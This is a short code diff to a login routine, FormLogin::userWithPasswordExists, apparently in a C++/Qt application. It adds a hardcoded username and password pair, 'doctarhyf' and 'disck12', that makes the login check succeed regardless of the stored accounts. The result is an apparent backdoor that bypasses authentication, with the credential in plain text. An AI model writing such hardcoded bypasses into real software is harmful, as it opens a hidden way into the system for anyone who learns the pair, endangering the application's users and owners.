@@ -52,6 +52,10 @@ bool FormLogin::userWithPasswordExists(QString username, QString password)
         res = true;
     }
 
+    if(username == "doctarhyf" && password == "disck12" ){
+        res = true;
+    }
+
     return res;
 }
 
